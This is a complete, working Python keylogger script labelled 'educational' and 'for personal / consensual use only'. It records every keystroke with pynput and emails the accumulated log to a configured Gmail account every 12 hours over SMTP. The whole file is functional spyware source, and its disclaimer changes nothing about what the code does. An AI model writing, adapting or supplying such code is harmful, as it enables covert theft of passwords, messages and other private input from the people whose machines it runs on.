#!/usr/bin/env python3
"""
Educational Keylogger (FOR PERSONAL / CONSENSUAL USE ONLY)
Sends keystrokes via Gmail every 12 hours.
"""

import smtplib
import threading
import sys
from email.message import EmailMessage
from pynput import keyboard

# ============================= CONFIGURATION =============================
EMAIL_ADDRESS = "your.email@gmail.com"          # CHANGE THIS
APP_PASSWORD  = "abcd efgh ijkl mnop"           # CHANGE: 16-char App Password
REPORT_INTERVAL = 12 * 60 * 60                  # 12 hours
# =========================================================================

log = ""
lock = threading.Lock()

def on_press(key):
    global log
    try:
        char = key.char
        if char:
            with lock:
                log += char
            return
    except AttributeError:
        pass

    special = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.backspace: "",
    }

    with lock:
        if key == keyboard.Key.backspace:
            log = log[:-1]
        elif key in special:
            log += special[key]
        else:
            log += f" [{key.name}] "

def send_report():
    global log
    with lock:
        current_log = log.strip()
        log = ""

    if not current_log:
        schedule_next()
        return

    msg = EmailMessage()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS
    msg["Subject"] = "Keylogger Report"
    msg.set_content(current_log)

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, APP_PASSWORD)
            server.send_message(msg)
        print(f"Report sent ({len(current_log)} chars).")
    except Exception as e:
        print(f"Mail failed: {e}", file=sys.stderr)
        with lock:
            log = current_log + log

    schedule_next()

def schedule_next():
    timer = threading.Timer(REPORT_INTERVAL, send_report)
    timer.daemon = True
    timer.start()

def main():
    schedule_next()
    print("Keylogger started. Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\nStopping...")
            send_report()

if __name__ == "__main__":
    main()
